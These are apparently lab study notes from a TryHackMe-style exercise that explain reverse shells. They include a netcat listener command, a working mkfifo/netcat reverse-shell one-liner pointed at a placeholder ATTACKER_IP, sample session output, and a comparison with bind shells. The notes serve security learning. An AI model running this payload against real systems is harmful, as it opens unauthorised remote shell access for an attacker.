**Reverse Shell**

    A reverse shell is a shell where the target machine connects back to the attacker's/pentester's machine.

    The attacker first waits for the connection using a listener.

    1. Netcat Listener
    Example: nc -lvnp 443
    Meaning:
    -l → listen for an incoming connection
    -v → verbose output
    -n → don't perform DNS lookups
    -p 443 → listen on port 443

    It basically means "Wait for a connection on port 443 and show connection details."

    Ports such as 80, 443, 53, 8080, 139, and 445 may be used because they are associated with legitimate network services. In real attacks, using commonly used ports can sometimes make malicious traffic less obvious, although modern security tools can detect reverse shells regardless of the port.

    2. Target Executes a Reverse-Shell Payload
    The target then executes a payload that:

     1. Creates a communication channel.
     2. Starts a shell.
     3. Connects that shell to the attacker's listener.
     4. Sends command input/output through the connection.

     The example uses a named pipe (FIFO) to connect the shell's input and output to Netcat.

     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f

    3. Attacker Receives the Shell

    When the target connects:
    attacker@kali:~$ nc -lvnp 443
    listening on [any] 443 ... 
    connect to [10.4.99.209] from [10.10.13.37] 59964

    target@tryhackme:~$

    The important part is:
    connect to [10.4.99.209] from [10.10.13.37]

    This indicates that 10.10.13.37 (the target) initiated the connection back to the listener.

    The attacker now has a shell such as:
    target@tryhackme:~$

    and can execute commands through that shell, subject to the permissions of the compromised account.

**Why Reverse Shells Are Useful**

    A reverse shell can be useful when inbound connections to the target are blocked, but the target is allowed to make outbound connections.

    This is why reverse shells are common in penetration testing and post-exploitation.

**Reverse Shell vs Bind Shell**

    Target connects to attacker in Reverse Shell, while Attacker connects to target in Bind Shell.

    Attacker listens in Reverse Shell, while target listens in Bind Shell.

    Reverse often useful when inbound connections are restricted. Bind requires attacker to reach the target's listening port.

**A reverse shell is a shell where the target initiates an outbound connection back to the attacker, giving the attacker command-line access through that connection.**